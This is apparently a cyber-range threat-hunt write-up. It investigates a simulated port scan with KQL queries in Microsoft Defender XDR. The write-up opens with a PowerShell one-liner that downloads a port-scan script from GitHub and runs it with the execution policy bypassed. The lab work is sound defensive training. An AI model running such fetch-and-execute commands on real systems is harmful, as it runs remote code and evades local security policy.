# Threat Hunt: Sudden Network Slowdown

### Phase 1: Simulating the Trigger Event

To begin this threat hunt, it was necessary to simulate suspicious network activity that would be logged by a security monitoring platform. The goal was to mimic the reconnaissance phase of an attack, specifically a network-wide port scan, which is a common cause of network degradation and a frequent trigger for a security investigation.

The following PowerShell command was executed on a test machine to generate this activity:

```powershell
# This one-line command first downloads a port scanning script...
Invoke-WebRequest -Uri '[https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1](https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1)' -OutFile 'C:\programdata\portscan.ps1';

# ...and then immediately executes it, bypassing the local security policy.
cmd /c powershell.exe -ExecutionPolicy Bypass -File C:\programdata\portscan.ps1
```
## Tables Used to Detect IoCs:
| Table Name | Purpose | Official Documentation |
| :--- | :---: | :--- |
| **`DeviceFileEvents`** | Tracks events related to file creation, modification, and deletion on your devices. | [Microsoft Learn Link](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicefileevents-table) |
| **`DeviceProcessEvents`** | Monitors the creation of new processes, like when a program or script starts running. | [Microsoft Learn Link](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-deviceprocessevents-table) |
| **`DeviceNetworkEvents`**| Records all network activity, including inbound and outbound connections from devices. | [Microsoft Learn Link](https://learn.microsoft.com/en-us/defender-xdr/advanced-hunting-devicenetworkevents-table) |
---
## Related KQL Queries

Below are the KQL queries used in Microsoft Defender XDR to investigate the network slowdown and pinpoint the root cause.

---
#### 1. Initial Discovery: High-Volume Failed Connections
This first query was used to find hosts generating an unusual number of failed network connections, which is a common indicator of a port scan.

```kql
let target_machine = "nemwindows10";
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where DeviceName == target_machine
| where ActionType == "ConnectionFailed"
| summarize ConnectionCount = count() by DeviceName, ActionType, LocalIP
| order by ConnectionCount
```
### 2. Confirming the Port Scan
After observing the failed connections, this query was used to examine the specific traffic and confirm that a sequential port scan was occurring.

```kql
let target_machine = "nemwindows10";
let problematic_LocalIP = "10.0.0.108";
DeviceNetworkEvents
| where Timestamp > ago(7d)
| where DeviceName == target_machine
| where ActionType == "ConnectionFailed"
| where LocalIP == problematic_LocalIP
| project Timestamp, InitiatingProcessFileName, RemoteIP, RemotePort, Protocol
| sort by Timestamp asc
```

### 3. Identifying the Malicious Process
Once the port scan was confirmed, this final query was used to pivot to the process events on the host to identify which script or program launched the attack.

```kql
let target_machine = "nemwindows10";
let Specific_StartDate_UTC = datetime(2025-05-02T05:35:00Z); //May 2nd 5:35 AM UTC time.
let Specific_EndDate_UTC = datetime(2025-05-02T05:40:00Z); //May2nd 5:40 AM UTC time.
DeviceProcessEvents
| where DeviceName == target_machine
| where Timestamp between (Specific_StartDate_UTC .. Specific_EndDate_UTC )
| project Timestamp, ActionType, FileName, ProcessCommandline, AccountName, InitiatingProcessAccountName, InitiatingProcessParentFileName
| sort by Timestamp asc
```
---

## Created By:
- **Author Name**: Jorge Juarez
- **Author Contact**: https://www.linkedin.com/in/jorgejuarez1/
- **Date**: May 2, 2025

## Validated By:
- **Reviewer Name**: 
- **Reviewer Contact**: 
- **Validation Date**: 

---

## Additional Notes:
- **None**

---

## Revision History:
| **Version** | **Changes**                   | **Date**         | **Modified By**   |
|-------------|-------------------------------|------------------|-------------------|
| 1.0         | Initial draft                  | `July 8, 2025`  | `Jorge Juarez`   
